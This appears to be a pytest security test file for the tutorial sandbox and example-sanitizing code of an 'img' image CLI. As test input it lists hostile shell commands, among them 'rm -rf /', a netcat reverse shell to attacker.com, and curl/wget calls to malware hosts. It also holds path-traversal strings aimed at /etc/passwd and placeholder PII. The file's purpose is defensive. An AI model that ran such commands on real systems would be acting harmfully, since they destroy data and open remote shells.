"""
Security tests for documentation components
"""

import pytest
import asyncio
from unittest.mock import Mock, patch, MagicMock
from pathlib import Path
import tempfile

from app.cli.documentation.tutorial_engine import TutorialEngine
from app.cli.documentation.examples import CommandExample, ExampleDatabase


class TestTutorialSandboxSecurity:
    """Test tutorial sandbox security restrictions"""

    @pytest.fixture
    def tutorial_engine(self):
        """Create tutorial engine with temp directory"""
        engine = TutorialEngine()
        engine.sandbox_dir = Path(tempfile.mkdtemp())
        return engine

    @pytest.mark.asyncio
    async def test_blocks_dangerous_commands(self, tutorial_engine):
        """Test that dangerous commands are blocked"""
        dangerous_commands = [
            "rm -rf /",
            "curl http://evil.com",
            "wget http://malware.com",
            "python exploit.py",
            "bash -c 'evil'",
            "sudo rm -rf /",
            "nc -e /bin/sh attacker.com 4444",
            "ssh user@server",
            "perl -e 'system(\"rm -rf /\")'",
        ]

        for cmd in dangerous_commands:
            with pytest.raises(ValueError) as exc_info:
                await tutorial_engine._run_sandboxed_command(cmd)
            assert "not allowed" in str(exc_info.value).lower()

    @pytest.mark.asyncio
    async def test_blocks_absolute_paths(self, tutorial_engine):
        """Test that absolute paths are blocked"""
        commands_with_abs_paths = [
            "/usr/bin/img convert",
            "img convert /etc/passwd",
            "img convert C:\\Windows\\System32\\config",
        ]

        for cmd in commands_with_abs_paths:
            with pytest.raises(ValueError) as exc_info:
                await tutorial_engine._run_sandboxed_command(cmd)
            assert (
                "absolute path" in str(exc_info.value).lower()
                or "not allowed" in str(exc_info.value).lower()
            )

    @pytest.mark.asyncio
    async def test_blocks_parent_directory_access(self, tutorial_engine):
        """Test that parent directory access is blocked"""
        commands_with_parent_access = [
            "img convert ../../../etc/passwd",
            "img convert ..\\..\\Windows\\System32\\config",
            "img batch ../* -f webp",
        ]

        for cmd in commands_with_parent_access:
            with pytest.raises(ValueError) as exc_info:
                await tutorial_engine._run_sandboxed_command(cmd)
            assert (
                "parent directory" in str(exc_info.value).lower()
                or "not allowed" in str(exc_info.value).lower()
            )

    @pytest.mark.asyncio
    async def test_only_allows_img_commands(self, tutorial_engine):
        """Test that only img commands are allowed"""
        non_img_commands = [
            "ls -la",
            "cat /etc/passwd",
            "echo 'test'",
            "pwd",
        ]

        for cmd in non_img_commands:
            with pytest.raises(ValueError) as exc_info:
                await tutorial_engine._run_sandboxed_command(cmd)
            assert "only 'img' commands" in str(exc_info.value).lower()

    @pytest.mark.asyncio
    async def test_command_timeout(self, tutorial_engine):
        """Test that commands have timeout protection"""
        # Mock a command that would hang
        with patch("asyncio.create_subprocess_shell") as mock_subprocess:
            mock_process = Mock()
            mock_process.communicate = Mock(side_effect=asyncio.TimeoutError())
            mock_subprocess.return_value = mock_process

            result = await tutorial_engine._run_sandboxed_command(
                "img convert test.jpg"
            )

            # Should handle timeout gracefully
            assert "timeout" in result.lower() or "simulated" in result.lower()


class TestExamplePIISanitization:
    """Test PII sanitization in examples"""

    def test_sanitizes_user_directories(self):
        """Test that user directories are sanitized"""
        example = CommandExample(
            id="test",
            command="img convert /home/johndoe/photos/family.jpg -f webp",
            description="Test",
            category="conversion",
        )

        sanitized = example.sanitized_command()
        assert "johndoe" not in sanitized
        assert "/home/user/" in sanitized

    def test_sanitizes_email_addresses(self):
        """Test that email addresses are sanitized"""
        example = CommandExample(
            id="test",
            command="img convert photo.jpg -o john.doe@company.com.jpg",
            description="Test",
            category="conversion",
        )

        sanitized = example.sanitized_command()
        assert "john.doe@company.com" not in sanitized
        assert "user@example.com" in sanitized

    def test_sanitizes_ip_addresses(self):
        """Test that IP addresses are sanitized"""
        example = CommandExample(
            id="test",
            command="img convert --server 192.168.1.100 photo.jpg",
            description="Test",
            category="conversion",
        )

        sanitized = example.sanitized_command()
        assert "192.168.1.100" not in sanitized
        assert "127.0.0.1" in sanitized

    def test_sanitizes_api_keys(self):
        """Test that API keys are sanitized"""
        example = CommandExample(
            id="test",
            command='img convert photo.jpg --api-key="sk_live_abcd1234efgh5678ijkl9012mnop3456"',
            description="Test",
            category="conversion",
        )

        sanitized = example.sanitized_command()
        assert "sk_live_abcd1234efgh5678ijkl9012mnop3456" not in sanitized
        assert "REDACTED" in sanitized

    def test_sanitizes_phone_numbers(self):
        """Test that phone numbers are sanitized"""
        example = CommandExample(
            id="test",
            command="img convert 555-123-4567.jpg -f webp",
            description="Test",
            category="conversion",
        )

        sanitized = example.sanitized_command()
        assert "555-123-4567" not in sanitized
        assert "555-0100" in sanitized

    def test_sanitizes_social_security_numbers(self):
        """Test that SSNs are sanitized"""
        example = CommandExample(
            id="test",
            command="img convert doc_123-45-6789.jpg -f pdf",
            description="Test",
            category="conversion",
        )

        sanitized = example.sanitized_command()
        assert "123-45-6789" not in sanitized
        assert "XXX-XX-XXXX" in sanitized

    def test_sanitizes_credit_card_numbers(self):
        """Test that credit card numbers are sanitized"""
        example = CommandExample(
            id="test",
            command="img convert receipt_4111-1111-1111-1111.jpg",
            description="Test",
            category="conversion",
        )

        sanitized = example.sanitized_command()
        assert "4111-1111-1111-1111" not in sanitized
        assert "XXXX-XXXX-XXXX-XXXX" in sanitized

    def test_sanitizes_personal_paths(self):
        """Test that personal file paths are sanitized"""
        example = CommandExample(
            id="test",
            command="img convert /Users/johndoe/Desktop/personal_photo.jpg",
            description="Test",
            category="conversion",
        )

        sanitized = example.sanitized_command()
        assert "personal_photo.jpg" not in sanitized
        assert "/Desktop/sample.jpg" in sanitized


class TestDocumentationOfflineOperation:
    """Test that documentation works completely offline"""

    def test_no_network_calls_in_help(self):
        """Test that help system makes no network calls"""
        from app.cli.documentation.help_context import HelpContextAnalyzer

        with patch("urllib.request.urlopen") as mock_urlopen:
            with patch("requests.get") as mock_requests:
                with patch("httpx.get") as mock_httpx:
                    analyzer = HelpContextAnalyzer()

                    # Should not make any network calls
                    mock_urlopen.assert_not_called()
                    mock_requests.assert_not_called()
                    mock_httpx.assert_not_called()

    def test_no_network_calls_in_tutorials(self):
        """Test that tutorial system makes no network calls"""
        with patch("urllib.request.urlopen") as mock_urlopen:
            with patch("requests.get") as mock_requests:
                with patch("httpx.get") as mock_httpx:
                    engine = TutorialEngine()

                    # Should not make any network calls
                    mock_urlopen.assert_not_called()
                    mock_requests.assert_not_called()
                    mock_httpx.assert_not_called()

    def test_no_telemetry_in_documentation(self):
        """Test that no telemetry is sent"""
        from app.cli.documentation.knowledge_base import KnowledgeBase

        with patch("socket.socket") as mock_socket:
            kb = KnowledgeBase()

            # Search should not open any network sockets
            kb.search("test query")
            mock_socket.assert_not_called()
